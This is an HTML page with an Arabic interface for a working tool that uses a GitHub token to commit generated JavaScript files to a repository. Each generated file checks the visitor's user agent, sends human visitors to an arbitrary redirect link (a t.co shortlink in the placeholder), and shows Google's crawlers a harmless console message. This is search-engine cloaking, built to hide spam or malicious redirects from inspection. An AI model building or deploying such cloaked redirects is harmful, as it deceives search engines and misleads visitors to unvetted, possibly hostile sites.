<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مولّد ملفات JS على GitHub</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
    background: #0f1115; color: #e6e9ef;
    padding: 24px; line-height: 1.6;
  }
  .box {
    max-width: 820px; margin: 0 auto;
    background: #161a21; border: 1px solid #2a2f3a;
    border-radius: 14px; padding: 26px;
  }
  h1 { color: #7ee0a0; font-size: 1.5rem; margin-bottom: 18px; text-align: center; }
  h2 { color: #7ee0a0; font-size: 1.05rem; margin: 22px 0 10px; border-bottom: 1px solid #2a2f3a; padding-bottom: 6px; }
  label { display: block; margin: 12px 0 6px; font-size: 0.9rem; color: #aab3c2; }
  input {
    width: 100%; padding: 11px 13px;
    background: #0f1115; border: 1px solid #2a2f3a;
    border-radius: 8px; color: #e6e9ef; font-size: 0.95rem;
    outline: none; font-family: inherit;
  }
  input:focus { border-color: #7ee0a0; }
  button {
    width: 100%; margin-top: 18px;
    background: #7ee0a0; color: #0f1115;
    border: none; border-radius: 8px;
    padding: 12px; font-size: 1rem;
    font-weight: 700; cursor: pointer;
    transition: background 0.2s;
  }
  button:hover { background: #63c98a; }
  button:disabled { background: #2a2f3a; color: #6c7787; cursor: not-allowed; }
  button.secondary { background: #2a2f3a; color: #e6e9ef; }
  button.secondary:hover { background: #363d4a; }
  .status {
    margin-top: 14px; padding: 12px;
    border-radius: 8px; font-size: 0.9rem;
    background: #0b0d11; border: 1px solid #2a2f3a;
    min-height: 20px; white-space: pre-wrap;
  }
  .ok  { color: #7ee0a0; border-color: #7ee0a0; }
  .err { color: #ff6b6b; border-color: #ff6b6b; }
  .hint { font-size: 0.8rem; color: #6c7787; margin-top: 4px; }
  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  @media (max-width: 600px) { .grid2 { grid-template-columns: 1fr; } }
  .filename-row { display: flex; gap: 8px; align-items: center; }
  .filename-row input { flex: 1; }
  .filename-row button {
    width: auto; margin: 0; padding: 11px 16px;
    background: #2a2f3a; color: #e6e9ef;
  }
  .filename-row button:hover { background: #363d4a; }
  .files-list {
    margin-top: 10px; max-height: 200px; overflow-y: auto;
    border: 1px solid #2a2f3a; border-radius: 8px;
    background: #0b0d11;
  }
  .file-item {
    padding: 8px 12px; border-bottom: 1px solid #1e2229;
    display: flex; justify-content: space-between; align-items: center;
    font-size: 0.88rem;
  }
  .file-item:last-child { border-bottom: none; }
  .file-item code { color: #7ee0a0; font-size: 0.85rem; }
  .file-item button {
    width: auto; margin: 0; padding: 4px 10px;
    font-size: 0.78rem; background: #2a2f3a; color: #e6e9ef;
  }
  .file-item button:hover { background: #363d4a; }
  .quick-links {
    display: flex; gap: 10px; flex-wrap: wrap;
    margin-bottom: 14px;
  }
  .quick-links a {
    flex: 1; min-width: 180px;
    text-align: center; text-decoration: none;
    background: #0b0d11; border: 1px solid #2a2f3a;
    color: #7ee0a0; padding: 9px 12px;
    border-radius: 8px; font-size: 0.85rem;
    font-weight: 600; transition: background 0.2s;
  }
  .quick-links a:hover { background: #161a21; }
</style>
</head>
<body>
<div class="box">
  <h1>مولّد ملفات JS على GitHub</h1>

  <!-- ===== روابط سريعة أمام الإعدادات ===== -->
  <div class="quick-links">
    <a href="https://github.com/settings/tokens" target="_blank">🔑 إنشاء التوكن</a>
    <a href="https://github.com/new" target="_blank">📦 إنشاء ريكو</a>
  </div>

  <!-- ===== الإعدادات ===== -->
  <h2>⚙️ الإعدادات</h2>

  <label>GitHub Token (صلاحية repo)</label>
  <input type="password" id="token" placeholder="ghp_xxxxxxxxxxxxxxxxxxxx">
  <div class="hint">الصلاحية المطلوبة: <code>repo</code> فقط. يُحفظ في متصفحك فقط.</div>

  <div class="grid2">
    <div>
      <label>اسم المستخدم / المنظمة</label>
      <input type="text" id="owner" placeholder="username">
    </div>
    <div>
      <label>اسم الريكو (الذي فيه ملفات JS)</label>
      <input type="text" id="repo" placeholder="my-repo">
    </div>
  </div>

  <div class="grid2">
    <div>
      <label>الفرع (branch)</label>
      <input type="text" id="branch" value="main">
    </div>
    <div>
      <label>المجلد (اختياري)</label>
      <input type="text" id="folder" placeholder="scripts (اتركه فارغاً إن لم يكن)">
    </div>
  </div>

  <!-- ===== قائمة الملفات ===== -->
  <h2>📂 الملفات الموجودة مسبقاً</h2>
  <div class="filename-row" style="margin-bottom:10px;">
    <button type="button" id="listBtn" class="secondary" style="width:100%; margin:0;">🔄 جلب قائمة الملفات من GitHub</button>
  </div>
  <div class="files-list" id="filesList">
    <div class="file-item" style="justify-content:center;color:#6c7787;">اضغط على "جلب قائمة الملفات" لعرض الملفات الموجودة.</div>
  </div>

  <!-- ===== إنشاء ملف جديد ===== -->
  <h2>🆕 إنشاء ملف جديد</h2>

  <label>رابط التحويل</label>
  <input type="url" id="redirect" placeholder="https://t.co/sweVVzdVeL">

  <label>اسم الملف (بدون .js)</label>
  <div class="filename-row">
    <input type="text" id="filename" placeholder="sweVVzdVeL">
    <button type="button" id="autoName">🎲 توليد تلقائي</button>
  </div>
  <div class="hint">يُضاف <code>.js</code> تلقائياً. الاسم لا يمكن أن يكون موجوداً مسبقاً.</div>

  <button id="go">🚀 إنشاء الملف على GitHub</button>

  <div class="status" id="status">جاهز.</div>
</div>

<script>
(() => {
  'use strict';

  const $ = id => document.getElementById(id);
  const tokenEl    = $('token');
  const ownerEl    = $('owner');
  const repoEl     = $('repo');
  const branchEl   = $('branch');
  const folderEl   = $('folder');
  const redirectEl = $('redirect');
  const filenameEl = $('filename');
  const autoBtn    = $('autoName');
  const listBtn    = $('listBtn');
  const filesList  = $('filesList');
  const goBtn      = $('go');
  const statusEl   = $('status');

  ['owner','repo','branch','folder'].forEach(k => {
    const v = localStorage.getItem('gh_' + k);
    if (v) $(k).value = v;
  });

  const setStatus = (msg, type = '') => {
    statusEl.textContent = msg;
    statusEl.className = 'status ' + type;
  };

  const extractName = (url) => {
    try {
      const u = new URL(url);
      let parts = u.pathname.split('/').filter(Boolean);
      let last = parts.length ? parts[parts.length - 1] : '';
      if (!last) last = u.hostname.replace(/\./g, '_');
      last = last.replace(/[^a-zA-Z0-9_-]/g, '');
      return last || ('redirect_' + Date.now());
    } catch (e) {
      return 'redirect_' + Date.now();
    }
  };

  autoBtn.addEventListener('click', () => {
    const url = redirectEl.value.trim();
    if (!url) { setStatus('⚠️ ضع رابط التحويل أولاً.', 'err'); return; }
    filenameEl.value = extractName(url);
    setStatus('✅ تم توليد الاسم: ' + filenameEl.value + '.js');
  });

  const buildJs = (redirect) => {
    const safe = String(redirect).replace(/"/g, '\\"');
    return [
      'const ua = navigator.userAgent;',
      '',
      'if (',
      "  !ua.includes('Googlebot') &&",
      "  !ua.includes('Google-InspectionTool')",
      ') {',
      `  window.location.href = "${safe}";`,
      '} else {',
      '  console.log("error ya baby");',
      '}',
      ''
    ].join('\n');
  };

  const toBase64 = (str) => {
    const bytes = new TextEncoder().encode(str);
    let bin = '';
    bytes.forEach(b => bin += String.fromCharCode(b));
    return btoa(bin);
  };

  const ghApi = (url, opts = {}) =>
    fetch(url, {
      ...opts,
      headers: {
        'Authorization': 'Bearer ' + tokenEl.value.trim(),
        'Accept': 'application/vnd.github+json',
        'X-GitHub-Api-Version': '2022-11-28',
        ...(opts.headers || {})
      }
    });

  // ===== جلب قائمة الملفات =====
  listBtn.addEventListener('click', async () => {
    const token  = tokenEl.value.trim();
    const owner  = ownerEl.value.trim();
    const repo   = repoEl.value.trim();
    const branch = branchEl.value.trim() || 'main';
    const folder = folderEl.value.trim().replace(/^\/+|\/+$/g, '');

    if (!token || !owner || !repo) {
      setStatus('⚠️ املأ التوكن واسم المستخدم والريكو أولاً.', 'err');
      return;
    }

    listBtn.disabled = true;
    filesList.innerHTML = '<div class="file-item" style="justify-content:center;color:#6c7787;">⏳ جاري الجلب...</div>';

    try {
      const path = folder ? folder : '';
      const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${encodeURIComponent(path)}?ref=${encodeURIComponent(branch)}`;
      const res = await ghApi(apiUrl);

      if (!res.ok) {
        const err = await res.text();
        throw new Error('فشل الجلب (' + res.status + '): ' + err);
      }

      const items = await res.json();
      const jsFiles = items.filter(f => f.type === 'file' && f.name.endsWith('.js'));

      if (!jsFiles.length) {
        filesList.innerHTML = '<div class="file-item" style="justify-content:center;color:#6c7787;">لا توجد ملفات .js في هذا المجلد.</div>';
      } else {
        filesList.innerHTML = jsFiles.map(f => {
          const nameNoExt = f.name.replace(/\.js$/, '');
          return `<div class="file-item">
            <code>${f.name}</code>
            <button type="button" data-name="${nameNoExt}" class="use-name">استخدم هذا الاسم</button>
          </div>`;
        }).join('');

        filesList.querySelectorAll('.use-name').forEach(btn => {
          btn.addEventListener('click', () => {
            filenameEl.value = btn.dataset.name + '_new';
            setStatus('⚠️ الاسم موجود مسبقاً. تم إضافة "_new" — عدّله إن أردت.');
          });
        });
      }

      setStatus('✅ تم جلب ' + jsFiles.length + ' ملف JS.');
    } catch (e) {
      filesList.innerHTML = '<div class="file-item" style="justify-content:center;color:#ff6b6b;">❌ ' + e.message + '</div>';
      setStatus('❌ ' + e.message, 'err');
    } finally {
      listBtn.disabled = false;
    }
  });

  // ===== إنشاء ملف =====
  goBtn.addEventListener('click', async () => {
    goBtn.disabled = true;
    setStatus('⏳ جاري العمل...');

    try {
      const token    = tokenEl.value.trim();
      const owner    = ownerEl.value.trim();
      const repo     = repoEl.value.trim();
      const branch   = branchEl.value.trim() || 'main';
      const folder   = folderEl.value.trim().replace(/^\/+|\/+$/g, '');
      const redirect = redirectEl.value.trim();

      let name = filenameEl.value.trim();
      if (!name) {
        name = extractName(redirect);
        filenameEl.value = name;
      }
      name = name.replace(/\.js$/i, '');
      if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
        throw new Error('اسم الملف يجب أن يحتوي حروفاً إنجليزية وأرقاماً و _ و - فقط.');
      }

      const filePath = (folder ? folder + '/' : '') + name + '.js';

      if (!token || !owner || !repo || !redirect) {
        throw new Error('املأ كل الحقول المطلوبة.');
      }
      if (!/^https?:\/\//i.test(redirect)) {
        throw new Error('الرابط يجب أن يبدأ بـ http:// أو https://');
      }

      ['owner','repo','branch','folder'].forEach(k => {
        localStorage.setItem('gh_' + k, $(k).value);
      });

      const apiUrl = `https://api.github.com/repos/${owner}/${repo}/contents/${encodeURIComponent(filePath)}`;

      setStatus('⏳ فحص ' + filePath + ' ...');
      const checkRes = await ghApi(apiUrl + '?ref=' + encodeURIComponent(branch));

      if (checkRes.status === 200) {
        const data = await checkRes.json();
        throw new Error(
          'الملف "' + filePath + '" موجود مسبقاً.\n' +
          'اختر اسماً مختلفاً أو استخدم "توليد تلقائي".\n' +
          'الرابط: ' + (data.html_url || '')
        );
      }
      if (checkRes.status !== 404) {
        const errText = await checkRes.text();
        throw new Error('فشل الفحص (' + checkRes.status + '): ' + errText);
      }

      setStatus('⏳ إنشاء ' + filePath + ' ...');
      const body = {
        message: 'new redirect file: ' + filePath,
        content: toBase64(buildJs(redirect)),
        branch
      };

      const putRes = await ghApi(apiUrl, {
        method: 'PUT',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      });

      if (!putRes.ok) {
        const errText = await putRes.text();
        throw new Error('فشل الإنشاء (' + putRes.status + '): ' + errText);
      }

      const result = await putRes.json();
      const link = result.content && result.content.html_url ? result.content.html_url : '';

      setStatus(
        '✅ تم إنشاء ' + filePath + ' بنجاح!\n' +
        (link ? 'GitHub: ' + link + '\n' : '') +
        'استخدم في صفحتك:\n<script src="' + (folder ? '/' + folder : '') + '/' + name + '.js"><\/script>',
        'ok'
      );
    } catch (e) {
      setStatus('❌ ' + e.message, 'err');
    } finally {
      goBtn.disabled = false;
    }
  });

})();
</script>
</body>
</html>
